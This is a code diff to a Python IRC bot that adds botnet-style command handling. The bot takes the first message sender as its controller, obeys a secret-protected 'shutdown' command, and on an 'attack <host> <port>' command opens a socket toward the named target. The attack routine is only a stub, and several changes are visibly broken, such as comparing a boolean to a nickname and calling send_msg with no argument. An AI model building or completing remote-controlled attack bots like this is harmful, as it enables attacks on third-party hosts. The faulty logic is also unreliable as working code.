@@ -17,9 +17,10 @@ class Bot:
     CHANNEL = None
     SECRET = None
     BOT_SOCKET = None
+    CONTROLLER = None
 
 
-    BOT_TOTAL_COUNT = 6
+    ATTACK_COUNT = 6
     BOT_COUNT = 0
     NICK_COUNT = 0
 
@@ -27,7 +28,6 @@ class Bot:
     INPUTS = []
 
     PONG = False
-    CONTROLLER = False
     CONNECTED_SOCKET = False
     CONNECTED_SERVER = False
     JOINED = False
@@ -90,7 +90,8 @@ class Bot:
         
         print("DEBUG sending: " + data)
 
-        data = data.encode("utf-8")
+        if not isinstance(data, (bytes, bytearray)):
+            data = bytes(data, "utf-8")
 
         try:
             # queue up the data
@@ -113,7 +114,7 @@ class Bot:
                 continue
 
             # check if bot logged onto IRC server
-            if line[1] == "433":
+            elif line[1] == "433":
                 self.NICK_COUNT += 1
                 self.CONNECTED_SERVER = False
                 
@@ -130,6 +131,7 @@ class Bot:
 
             # responde to ping
             elif line[0] == "PING" and not self.PONG:
+                print("DEBUG ping")
                 pong = threading.Thread(target=self.pong, args=line[1])
                 self.PONG = True
 
@@ -138,18 +140,32 @@ class Bot:
 
         print("DEBUG: "  + data)
 
-        data = data.split()
+        data = data.split(":")
 
         # get the message and sendedr
         msg = data[-1]
-        sender = data[0].split(":")[1].split("!")[0]
+        sender = data[1].split("!")[0]
 
         print("DEBUG: " + msg)
         print("DEBUG: " + sender)
 
-        if "shutdown" in msg:
-            print("DEBUG TODO")
+        # check if controller
+        if self.CONTROLLER is None:
+            self.CONTROLLER = sender
 
+        if self.CONNECTED_SERVER == sender:
+            # shutdown bot
+            if ("shutdown " + self.SECRET) in msg:
+                self.shutdown()
+
+            msg = msg.split()
+
+            # attack with bot
+            if msg[0] == "attack" and msg[-1] == self.CHANNEL:
+                host = msg[1]
+                port = msg[2]
+
+                self.attack(host, port)
 
     def close_socket(self, sckt):
         """ Close a connection """
@@ -168,7 +184,9 @@ class Bot:
 
     def pong(self, daemon):
         """ Send pong """
-        threading.Timer(5.0, self.pong).start() 
+
+        # every few seconds
+        threading.Timer(60.0, self.pong).start() 
         self.send_msg("PONG " + daemon)
 
 
@@ -202,8 +220,21 @@ class Bot:
             print(str(e))
 
 
-    def attack(self):
+    def attack(self, host, port):
         """ Perform an attack """
+
+        port = int(port)
+
+        # increase count
+        self.ATTACK_COUNT += 1
+
+        # connect
+        try:
+            attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.send_msg()
+
+        finally:
+            pass
 
         return
 
@@ -216,6 +247,14 @@ class Bot:
 
     def shutdown(self):
         """ Shutdown the bot """
+
+        msg = "PRIVMSG #" + self.CHANNEL + " :edel" + str(self.NICK_COUNT) + " " + self.SECRET + "\n"
+
+        self.send_msg(msg)
+
+        print("Terminating bot...")
+
+        # sys.exit(0)
 
         return
 
@@ -253,7 +292,7 @@ class Bot:
                         self.join()
 
                     # listen for commands
-                    if self.CONNECTED_SERVER and self.JOINED:
+                    if self.CONNECTED_SERVER and self.JOINED and not self.PONG:
                         self.cmds(data)
 
                 # connection was closed
